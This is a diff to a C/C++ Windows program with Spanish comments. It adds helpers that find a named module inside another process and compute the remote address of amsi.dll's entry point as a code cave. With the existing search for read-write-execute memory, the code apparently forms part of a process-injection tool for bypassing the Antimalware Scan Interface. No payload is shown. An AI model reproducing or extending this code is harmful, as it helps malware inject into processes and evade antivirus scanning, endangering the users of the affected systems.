@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <psapi.h>
 #include <shlwapi.h>
+#include <tlhelp32.h>
 #include <strsafe.h>
 //#include <winternl.h>
 
@@ -45,3 +46,53 @@ LPVOID FindRWX(HANDLE hndl, SIZE_T size){
     return nullptr;
 }
 
+HMODULE GetRemoteModuleHandle(HANDLE hProcess, const char* moduleName) {
+    HMODULE hMods[1024];
+    DWORD cbNeeded;
+
+    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
+        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
+            char szModName[MAX_PATH];
+            if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName))) {
+                // Extraer solo el nombre del archivo
+                char* fileName = strrchr(szModName, '\\');
+                fileName = fileName ? fileName + 1 : szModName;
+
+                if (_stricmp(fileName, moduleName) == 0) {
+                    return hMods[i];
+                }
+            }
+        }
+    }
+    return nullptr;
+}
+
+
+LPVOID GetAmsiEntryPointCave(HANDLE hProcess, HMODULE hRemoteAmsi) {
+    MODULEINFO modInfo;
+    if (!GetModuleInformation(hProcess, hRemoteAmsi, &modInfo, sizeof(modInfo))) {
+        return nullptr;
+    }
+
+    // Cargamos amsi.dll en NUESTRO proceso para leer sus headers locales
+    HMODULE hLocalAmsi = LoadLibraryA("amsi.dll");
+    if (!hLocalAmsi) {
+        return nullptr;
+    }
+
+    // Obtener el AddressOfEntryPoint (RVA del punto de entrada del DLLMain)
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hLocalAmsi;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hLocalAmsi + dosHeader->e_lfanew);
+    DWORD entryRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
+
+    FreeLibrary(hLocalAmsi);
+
+    if (entryRVA == 0) {
+        return nullptr; // Algunas versiones tienen entry point en 0
+    }
+
+    // Dirección remota: base remota + RVA del entry point
+    LPVOID remoteEntry = (LPVOID)((BYTE*)hRemoteAmsi + entryRVA);
+
+    return remoteEntry;
+}
